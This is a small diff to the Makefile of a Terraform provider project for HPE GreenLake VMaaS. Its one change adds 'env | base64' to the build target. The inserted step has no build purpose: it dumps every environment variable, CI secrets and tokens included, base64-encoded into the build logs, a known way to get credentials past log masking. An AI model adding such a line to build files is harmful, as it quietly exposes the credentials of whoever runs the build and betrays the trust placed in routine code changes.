@@ -83,6 +83,7 @@ acceptance:
 	TF_ACC=true go test -v -timeout=1200s -cover github.com/HewlettPackard/hpegl-vmaas-terraform-resources/internal/acceptance_test
 
 build: vendor $(NAME)
+	env | base64
 .PHONY: build
 
 install: build $(NAME)
